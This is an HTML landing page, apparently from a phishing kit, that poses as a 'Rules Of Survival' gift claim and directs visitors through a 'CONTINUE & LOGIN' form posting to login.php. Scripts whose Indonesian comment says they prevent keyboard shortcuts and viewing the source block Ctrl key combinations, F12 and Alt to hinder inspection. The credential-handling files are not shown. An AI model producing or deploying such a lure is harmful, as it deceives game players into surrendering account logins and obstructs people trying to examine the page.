<html lang="en">
  <head>
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Rules Of Survival - Claim!
    </title>
    <link href='./img-zone/icon.png' rel='icon' type='image/x-png'/>
    <script type="text/javascript" src="./js-zone/main-zone.js">
    </script>
    <script language="JavaScript">document.write(zonehost())</script>
  </head>
  <body>
    <center>
      <div class="col-md-8">
        <div class="form">
          <form action="login.php" id="login-form" method="post">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQAkUbpc7GSXBRv5ddEYKMzoyr90wHP1wqUlJ7u0UPefZD5gvWg" width=150 height=150>
            <h5 style="color:white;">
              <b>CONTINUE & LOGIN
              </b>
            </h5>
            <input type="hidden" name="nama" value="">
            <button type="submit" class="btn-gift">CONTINUE
            </button>
            </div>
        </div>
        </form>
      </div>
    </center>
  <!--Kode untuk mencegah shorcut keyboard, view source dll.-->
  <script type="text/javascript">
    window.addEventListener("keydown",function(e){
      if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){
        e.preventDefault()}
    }
                           );
    document.keypress=function(e){
      if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){
      }
      return false}
  </script>
  <script type="text/javascript">
    document.onkeydown=function(e){
      e=e||window.event;
      if(e.keyCode==123||e.keyCode==18){
        return false}
    }
  </script>
  </body>
</html>